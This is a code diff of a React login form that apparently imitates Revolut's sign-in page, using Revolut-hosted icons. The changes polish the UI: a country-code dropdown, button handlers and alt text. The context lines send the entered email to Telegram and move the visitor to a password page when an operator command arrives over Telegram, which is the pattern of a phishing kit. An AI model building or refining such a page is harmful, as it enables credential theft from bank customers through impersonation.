@@ -13,7 +13,10 @@ import CountriesDropdown from '../components/CountriesDropdown'
 export default function LoginForm() {
     const router = useRouter();
     const { command } = useCommand(); // Get the current command from Telegram
-
+    const [email, setEmail] = useState('');
+    const [invalid, setInvalid] = useState(false);
+    const [isLoading, setIsLoading] = useState(false);
+    const [userEmail, setUserEmail] = useState('');
 
     // Handle command changes
     useEffect(() => {
@@ -27,7 +30,7 @@ export default function LoginForm() {
                 router.push('/PasswordPage');
             }, 500);
         }
-    }, [command]);
+    }, [command, router]);
 
     const { validateEmail } = useValidateEmail();
     // Handle email validation
@@ -39,14 +42,9 @@ export default function LoginForm() {
         sendMessageToTelegram(email);
     };
 
-
-
-
-
     // the useEffect below handles the api for country code and their data 
     const [countries, setCountries] = useState([]);
     const [selectedCountry, setSelectedCountry] = useState(null);
-
 
     // Function to mix and filter country arrays
     function mixCountries(formattedCountries, newCountryData) {
@@ -65,7 +63,6 @@ export default function LoginForm() {
         fetch('https://restcountries.com/v3.1/all')
             .then((response) => response.json())
             .then((data) => {
-
                 const formattedCountries = data.map((country) => ({
                     name: country.name.common,
                     flag: country.flags.png,
@@ -81,17 +78,34 @@ export default function LoginForm() {
             .catch((error) => console.error('Error fetching countries:', error));
     }, []);
 
-
-
     // This state handles the countries dropdown
-    const [dropdown, setDropdown] = useState(false)
-
+    const [dropdown, setDropdown] = useState(false);
 
     // Display countries dropdown
-    const DisplayDropdown = () => {
-        setDropdown(!dropdown)
-    }
+    const handleDropdownToggle = (e) => {
+        e.stopPropagation(); // Prevent event bubbling
+        setDropdown(!dropdown);
+    };
 
+    // Effect to handle closing dropdown when clicking outside
+    useEffect(() => {
+        const handleClickOutside = () => {
+            if (dropdown) {
+                setDropdown(false);
+            }
+        };
+
+        document.addEventListener('click', handleClickOutside);
+        return () => {
+            document.removeEventListener('click', handleClickOutside);
+        };
+    }, [dropdown]);
+
+    // Handle authentication button clicks
+    const handleAuthButtonClick = (method) => {
+        console.log(`ROUTER NEEDS TO PUSH TO ${method.toUpperCase()}`);
+        // Here you could add actual routing logic in the future
+    };
 
     return (
         <div className="bg-[#f7f7f7] text-black w-full h-screen flex flex-col">
@@ -119,13 +133,13 @@ export default function LoginForm() {
                                 <div className='flex flex-row w-full gap-[0.5rem] py-[1rem]'>
 
                                     {/* Phone number Input */}
-                                    <div className='ovedrflow-hidden h-[56px] gap-x-2 flex w-full rounded-[1rem] caret-[#4f55f1] text-[#717173]'>
-                                        <div className='md:w-[140px] w-[200px'>
+                                    <div className='overflow-hidden h-[56px] gap-x-2 flex w-full rounded-[1rem] caret-[#4f55f1] text-[#717173]'>
+                                        <div className='md:w-[140px] w-[130px]'>
                                             <div className='flex cursor-pointer dropdown-button gap-x-2 items-center p-[16px] flex-row transition-all duration-200 hover:bg-gray-200 bg-[#ebebf0] h-full rounded-2xl'
-                                                onClick={DisplayDropdown}
+                                                onClick={handleDropdownToggle}
                                             >
                                                 {/* Country icon */}
-                                                <div className='rounded-full h-6 w-6'>
+                                                <div className='rounded-full h-6 w-6 overflow-hidden'>
                                                     {selectedCountry?.flag ? (
                                                         <img
                                                             src={selectedCountry.flag}
@@ -144,8 +158,18 @@ export default function LoginForm() {
                                             </div>
                                         </div>
 
+                                        {dropdown && (
+                                            <div className="absolute top-0 left-0 w-full h-full z-10" onClick={(e) => { e.stopPropagation(); setDropdown(false); }}>
+                                                <div className="w-full h-full bg-black opacity-30"></div>
+                                            </div>
+                                        )}
 
-                                        <CountriesDropdown dropdown={dropdown} setDropdown={setDropdown} setSelectedCountry={setSelectedCountry} />
+                                        <CountriesDropdown 
+                                            dropdown={dropdown} 
+                                            setDropdown={setDropdown} 
+                                            setSelectedCountry={setSelectedCountry}
+                                            countries={countries} // Pass countries to the dropdown component
+                                        />
 
                                         {/* Number Input */}
                                         <div className="group bg-[#ebebf0] transition-all duration-200 hover:bg-[#e2e2e7] flex justify-center px-[16px] h-full rounded-2xl flex-grow">
@@ -184,38 +208,50 @@ export default function LoginForm() {
                             <div className='flex justify-around'>
                                 {/* Login with email */}
                                 <div className='flex flex-col items-center gap-[0.4rem] text-[#191c1f]'>
-                                    <button className='bg-white flex items-center justify-center w-[3rem] h-[3rem] rounded-[9999px]'>
-                                        <img src="https://assets.revolut.com/assets/icons/Envelope.svg" alt="" />
+                                    <button 
+                                        className='bg-white flex items-center justify-center w-[3rem] h-[3rem] rounded-[9999px]'
+                                        onClick={() => handleAuthButtonClick('email')}
+                                    >
+                                        <img src="https://assets.revolut.com/assets/icons/Envelope.svg" alt="Email" />
                                     </button>
                                     <div className='text-[#191c1f] text-[0.875rem] tracking-[-0.00714em] text-center'>
                                         Email
                                     </div>
                                 </div>
 
-                                {/* Login with email */}
+                                {/* Login with Google */}
                                 <div className='flex flex-col items-center gap-[0.4rem] text-[#191c1f]'>
-                                    <button className='bg-white flex items-center justify-center w-[3rem] h-[3rem] rounded-[9999px]'>
-                                        <img src="https://assets.revolut.com/assets/icons/LogoGoogle.svg" alt="" />
+                                    <button 
+                                        className='bg-white flex items-center justify-center w-[3rem] h-[3rem] rounded-[9999px]'
+                                        onClick={() => handleAuthButtonClick('google')}
+                                    >
+                                        <img src="https://assets.revolut.com/assets/icons/LogoGoogle.svg" alt="Google" />
                                     </button>
                                     <div className='text-[#191c1f] text-[0.875rem] tracking-[-0.00714em] text-center'>
                                         Google
                                     </div>
                                 </div>
 
-                                {/* Login with email */}
+                                {/* Login with Apple */}
                                 <div className='flex flex-col items-center gap-[0.4rem] text-[#191c1f]'>
-                                    <button className='bg-white flex items-center justify-center w-[3rem] h-[3rem] rounded-[9999px]'>
-                                        <img src="https://assets.revolut.com/assets/icons/LogoIOs.svg" alt="" />
+                                    <button 
+                                        className='bg-white flex items-center justify-center w-[3rem] h-[3rem] rounded-[9999px]'
+                                        onClick={() => handleAuthButtonClick('apple')}
+                                    >
+                                        <img src="https://assets.revolut.com/assets/icons/LogoIOs.svg" alt="Apple" />
                                     </button>
                                     <div className='text-[#191c1f] text-[0.875rem] tracking-[-0.00714em] text-center'>
                                         Apple
                                     </div>
                                 </div>
 
-                                {/* Login with email */}
+                                {/* Login with QR */}
                                 <div className='md:hidden flex flex-col items-center gap-[0.4rem] text-[#191c1f]'>
-                                    <button className='bg-white flex items-center justify-center w-[3rem] h-[3rem] rounded-[9999px]'>
-                                        <img src="https://assets.revolut.com/assets/icons/Qr.svg" alt="" />
+                                    <button 
+                                        className='bg-white flex items-center justify-center w-[3rem] h-[3rem] rounded-[9999px]'
+                                        onClick={() => handleAuthButtonClick('qr')}
+                                    >
+                                        <img src="https://assets.revolut.com/assets/icons/Qr.svg" alt="QR" />
                                     </button>
                                     <div className='text-[#191c1f] text-[0.875rem] tracking-[-0.00714em] text-center'>
                                         QR
